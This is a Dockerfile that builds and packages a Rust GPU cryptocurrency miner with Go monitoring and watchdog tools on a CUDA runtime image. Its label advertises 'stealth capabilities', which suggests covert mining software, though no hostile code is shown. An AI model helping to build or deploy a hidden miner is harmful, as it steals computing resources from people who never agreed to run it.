# Multi-Stage Production Dockerfile for OPUS-GPU Miner
# Stage 1: Rust builder - compiles the main GPU miner binary

FROM rust:1.80-slim AS rust-builder

# Install build dependencies
RUN apt-get update && apt-get install -y \
    pkg-config \
    libssl-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

# Copy Cargo configuration and dependencies first (layer caching)
COPY Cargo.toml Cargo.lock ./
COPY src/ ./src/

# Build release binary with optimizations
RUN cargo build --release --bin gpu-miner

# Verify binary was built
RUN ls -lh /build/target/release/gpu-miner

# Stage 2: Go builder - compiles GPU management tools

FROM golang:1.23-alpine AS go-builder

# Install build dependencies
RUN apk add --no-cache git make

WORKDIR /build

# Copy Go module files first (layer caching)
COPY gpu-tools/go.mod gpu-tools/go.sum ./
RUN go mod download

# Copy source code
COPY gpu-tools/ ./

# Build Go binaries
RUN go build -o gpu-ctl -ldflags="-s -w" cmd/gpu-ctl/main.go && \
    go build -o gpu-watchdog -ldflags="-s -w" cmd/gpu-watchdog/main.go && \
    go build -o gpu-monitor -ldflags="-s -w" cmd/gpu-monitor/main.go

# Verify binaries were built
RUN ls -lh gpu-ctl gpu-watchdog gpu-monitor

# Stage 3: Runtime - minimal production image with NVIDIA CUDA support

FROM nvidia/cuda:12.0.1-runtime-ubuntu22.04

LABEL maintainer="OPUS-GPU Team"
LABEL description="High-performance GPU cryptocurrency miner with stealth capabilities"
LABEL version="0.1.0"

# Install runtime dependencies
RUN apt-get update && apt-get install -y \
    ca-certificates \
    libssl3 \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Create application directories
RUN mkdir -p /etc/opus-gpu /var/log/opus-gpu /app/plugins

# Copy binaries from builder stages
COPY --from=rust-builder /build/target/release/gpu-miner /usr/local/bin/gpu-miner
COPY --from=go-builder /build/gpu-ctl /usr/local/bin/gpu-ctl
COPY --from=go-builder /build/gpu-watchdog /usr/local/bin/gpu-watchdog
COPY --from=go-builder /build/gpu-monitor /usr/local/bin/gpu-monitor

# Copy configuration files
COPY config/ /etc/opus-gpu/

# Create non-root user for security
RUN useradd -m -u 1000 -s /bin/bash miner && \
    chown -R miner:miner /etc/opus-gpu /var/log/opus-gpu /app

# Set permissions
RUN chmod +x /usr/local/bin/gpu-miner \
             /usr/local/bin/gpu-ctl \
             /usr/local/bin/gpu-watchdog \
             /usr/local/bin/gpu-monitor

# Switch to non-root user
USER miner

# Expose ports
# 8080: HTTP API
# 9090: Metrics (Prometheus)
EXPOSE 8080 9090

# Set working directory
WORKDIR /app

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=60s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# Environment variables
ENV RUST_LOG=info \
    CONFIG_PATH=/etc/opus-gpu/app.toml \
    LOG_PATH=/var/log/opus-gpu

# Entrypoint
ENTRYPOINT ["/usr/local/bin/gpu-miner"]

# Default command (can be overridden)
CMD ["--config", "/etc/opus-gpu/app.toml"]
